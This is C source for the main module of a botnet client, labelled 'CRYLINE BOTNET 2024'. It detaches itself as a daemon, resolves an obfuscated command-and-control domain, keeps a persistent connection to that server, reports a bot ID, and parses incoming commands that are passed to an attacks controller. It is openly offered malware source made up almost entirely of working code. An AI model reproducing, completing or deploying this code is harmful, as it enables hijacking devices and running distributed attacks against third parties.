/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

#define _GNU_SOURCE

#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/select.h>
#include <sys/socket.h>

#include "LIBRARIES.h"
#include "VALUES_DATASET.h"
#include "RANDOM_GENERATOR.h"
#include "CUSTOM_FUNCTIONS.h"
#include "ATTACKS_CONTROLLER.h"
#include "LOCAL_RECURSIVE_DNS_RESOLVER.h"

static void __RECURSIVE_CNC_DOMAIN_RESOLVER(void);
static void __CREATE_ESTABLISH_CNC_CONNECTION(void);
static void __CREATE_TEARDOWN_CNC_CONNECTION(void);

struct sockaddr_in __CNC_ADDRESS;

int GET_CONTROL_DESCRIPTOR = -1, GET_CNC_DESCRIPTOR = -1;

__GET_BOOL GET_PENDING_CONNECTION = 0;

__IPV4 LOCAL_ADDRESS_SETTER;

int __DAEMON(void)
{
    pid_t GET_CURRENT_PROCESS_ID;
    
    if ((GET_CURRENT_PROCESS_ID = fork()) < 0)
    {
        exit(0);
    }
    else if (GET_CURRENT_PROCESS_ID != 0)
    {
        exit(0);
    }

    setsid();

    umask(0);

    return 0;
}

int main(void)
{
    char ID_BUFFER[32];

    int GET_CNC_KEEP_ALIVE = 0;

    __DAEMON();

    LOCAL_ADDRESS_SETTER = __LOCAL_ADDR();

    __TABLE_INIT();

    __RANDOM_INIT();

    __ZERO(ID_BUFFER, 32);

    signal(SIGCHLD, SIG_IGN);

    __INIT();

    while (1)
    {
        fd_set GET_LOCAL_READ_DESCRIPTOR, GET_LOCAL_WRITE_DESCRIPTOR, GET_LOCAL_EXECUTE_DESCRIPTOR;

        struct timeval GET_TIMEOUT;

        int GET_MAXIMUM_DESCRIPTOR_POSITION, TIMEOUT_DESCRIPTOR_POSITION;

        FD_ZERO(&GET_LOCAL_READ_DESCRIPTOR);
        FD_ZERO(&GET_LOCAL_WRITE_DESCRIPTOR);

        if (GET_CONTROL_DESCRIPTOR != -1)
        {
            FD_SET(GET_CONTROL_DESCRIPTOR, &GET_LOCAL_READ_DESCRIPTOR);
        }

        if (GET_CNC_DESCRIPTOR == -1)
        {
            __CREATE_ESTABLISH_CNC_CONNECTION();
        }

        if (GET_PENDING_CONNECTION)
        {
            FD_SET(GET_CNC_DESCRIPTOR, &GET_LOCAL_WRITE_DESCRIPTOR);
        }
        else
        {
            FD_SET(GET_CNC_DESCRIPTOR, &GET_LOCAL_READ_DESCRIPTOR);
        }

        if (GET_CONTROL_DESCRIPTOR > GET_CNC_DESCRIPTOR)
        {
            GET_MAXIMUM_DESCRIPTOR_POSITION = GET_CONTROL_DESCRIPTOR;
        }
        else
        {
            GET_MAXIMUM_DESCRIPTOR_POSITION = GET_CNC_DESCRIPTOR;
        }
        GET_TIMEOUT.tv_usec = 0;
        GET_TIMEOUT.tv_sec = 10;

        TIMEOUT_DESCRIPTOR_POSITION = select(GET_MAXIMUM_DESCRIPTOR_POSITION + 1, &GET_LOCAL_READ_DESCRIPTOR, &GET_LOCAL_WRITE_DESCRIPTOR, NULL, &GET_TIMEOUT);

        if (TIMEOUT_DESCRIPTOR_POSITION == -1)
        {
            continue;
        }
        else if (TIMEOUT_DESCRIPTOR_POSITION == 0)
        {
            uint16_t GET_BUFFER_CURRENT_LENGHT = 0;

            if (GET_CNC_KEEP_ALIVE++ % 6 == 0)
            {
                send(GET_CNC_DESCRIPTOR, &GET_BUFFER_CURRENT_LENGHT, sizeof(GET_BUFFER_CURRENT_LENGHT), MSG_NOSIGNAL);
            }
        }

        if (GET_CONTROL_DESCRIPTOR != -1 && FD_ISSET(GET_CONTROL_DESCRIPTOR, &GET_LOCAL_READ_DESCRIPTOR))
        {
            struct sockaddr_in GET_AGENT_ADDRESS;
            
            socklen_t GET_AGENT_ADDRESS_LENGHT = sizeof(GET_AGENT_ADDRESS);

            accept(GET_CONTROL_DESCRIPTOR, (struct sockaddr *)&GET_AGENT_ADDRESS, &GET_AGENT_ADDRESS_LENGHT);

            exit(0);
        }

        if (GET_PENDING_CONNECTION)
        {
            GET_PENDING_CONNECTION = 0;

            if (!FD_ISSET(GET_CNC_DESCRIPTOR, &GET_LOCAL_WRITE_DESCRIPTOR))
            {
                __CREATE_TEARDOWN_CNC_CONNECTION();
            }
            else
            {
                int GET_LOCAL_ERROR_CODE = 0;

                socklen_t GET_ERROR_CODE_LENGHT = sizeof(GET_LOCAL_ERROR_CODE);

                int GET_CNC_KEEP_ALIVE = getsockopt(GET_CNC_DESCRIPTOR, SOL_SOCKET, SO_ERROR, &GET_LOCAL_ERROR_CODE, &GET_ERROR_CODE_LENGHT);

                if (GET_LOCAL_ERROR_CODE != 0 || GET_CNC_KEEP_ALIVE != 0)
                {
                    close(GET_CNC_DESCRIPTOR);

                    GET_CNC_DESCRIPTOR = -1;
                    
                    sleep((__RANDOM_NEXT() % 10) + 1);
                }
                else
                {
                    uint8_t GET_ID_LENGHT = __STRLEN(ID_BUFFER);

                    LOCAL_ADDRESS_SETTER = __LOCAL_ADDR();

                    send(GET_CNC_DESCRIPTOR, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);

                    send(GET_CNC_DESCRIPTOR, &GET_ID_LENGHT, sizeof(GET_ID_LENGHT), MSG_NOSIGNAL);

                    if (GET_ID_LENGHT > 0)
                    {
                        send(GET_CNC_DESCRIPTOR, ID_BUFFER, GET_ID_LENGHT, MSG_NOSIGNAL);
                    }
                }
            }
        }
        else if (GET_CNC_DESCRIPTOR != -1 && FD_ISSET(GET_CNC_DESCRIPTOR, &GET_LOCAL_READ_DESCRIPTOR))
        {
            int GET_CNC_KEEP_ALIVE;

            uint16_t GET_BUFFER_CURRENT_LENGHT;

            char GET_READ_BUFFER[1024];

            errno = 0;
            
            GET_CNC_KEEP_ALIVE = recv(GET_CNC_DESCRIPTOR, &GET_BUFFER_CURRENT_LENGHT, sizeof(GET_BUFFER_CURRENT_LENGHT), MSG_NOSIGNAL | MSG_PEEK);

            if (GET_CNC_KEEP_ALIVE == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                {
                    continue;
                }
                else
                {
                    GET_CNC_KEEP_ALIVE = 0;
                }
            }
            
            if (GET_CNC_KEEP_ALIVE == 0)
            {
                __CREATE_TEARDOWN_CNC_CONNECTION();

                continue;
            }

            if (GET_BUFFER_CURRENT_LENGHT == 0)
            {
                recv(GET_CNC_DESCRIPTOR, &GET_BUFFER_CURRENT_LENGHT, sizeof(GET_BUFFER_CURRENT_LENGHT), MSG_NOSIGNAL);

                continue;
            }
            GET_BUFFER_CURRENT_LENGHT = ntohs(GET_BUFFER_CURRENT_LENGHT);

            if (GET_BUFFER_CURRENT_LENGHT > sizeof(GET_READ_BUFFER))
            {
                close(GET_CNC_DESCRIPTOR);

                GET_CNC_DESCRIPTOR = -1;
            }

            errno = 0;

            GET_CNC_KEEP_ALIVE = recv(GET_CNC_DESCRIPTOR, GET_READ_BUFFER, GET_BUFFER_CURRENT_LENGHT, MSG_NOSIGNAL | MSG_PEEK);

            if (GET_CNC_KEEP_ALIVE == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                {
                    continue;
                }
                else
                {
                    GET_CNC_KEEP_ALIVE = 0;
                }
            }

            if (GET_CNC_KEEP_ALIVE == 0)
            {
                __CREATE_TEARDOWN_CNC_CONNECTION();

                continue;
            }

            recv(GET_CNC_DESCRIPTOR, &GET_BUFFER_CURRENT_LENGHT, sizeof(GET_BUFFER_CURRENT_LENGHT), MSG_NOSIGNAL);

            GET_BUFFER_CURRENT_LENGHT = ntohs(GET_BUFFER_CURRENT_LENGHT);

            recv(GET_CNC_DESCRIPTOR, GET_READ_BUFFER, GET_BUFFER_CURRENT_LENGHT, MSG_NOSIGNAL);

            if (GET_BUFFER_CURRENT_LENGHT > 0) 
            {
                __PARSE(GET_READ_BUFFER, GET_BUFFER_CURRENT_LENGHT);
            }
        }
    }

    return 0;
}

static void __RECURSIVE_CNC_DOMAIN_RESOLVER(void)
{
    struct __RESOLVE_DNS_ENTRIES *GET_LOCAL_ENTRIES;

    __CNC_ADDRESS.sin_family = AF_INET;

    __TABLE_UNLOCK_VALUE(0);

    GET_LOCAL_ENTRIES = __LOOKUP(__TABLE_RETRIEVED_VALUE(0, NULL));

    __TABLE_LOCK_VALUE(0);

    if (GET_LOCAL_ENTRIES == NULL)
    {
        return;
    }

    __CNC_ADDRESS.sin_addr.s_addr = GET_LOCAL_ENTRIES->_ADDRESS[__RANDOM_NEXT() % GET_LOCAL_ENTRIES->_ADDRESS_LENGHT];

    __RESOLVE_FREE_ENTRIES(GET_LOCAL_ENTRIES);

    __CNC_ADDRESS.sin_port = htons(__CNC_RPORT);
}

static void __CREATE_ESTABLISH_CNC_CONNECTION(void)
{
    if ((GET_CNC_DESCRIPTOR = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        return;
    }

    fcntl(GET_CNC_DESCRIPTOR, F_SETFL, O_NONBLOCK);

    __RECURSIVE_CNC_DOMAIN_RESOLVER();

    GET_PENDING_CONNECTION = 1;

    connect(GET_CNC_DESCRIPTOR, (struct sockaddr *)&__CNC_ADDRESS, sizeof(struct sockaddr_in));
}

static void __CREATE_TEARDOWN_CNC_CONNECTION(void)
{
    if (GET_CNC_DESCRIPTOR != -1)
    {
        close(GET_CNC_DESCRIPTOR);
    }

    GET_CNC_DESCRIPTOR = -1;

    sleep(1);
}
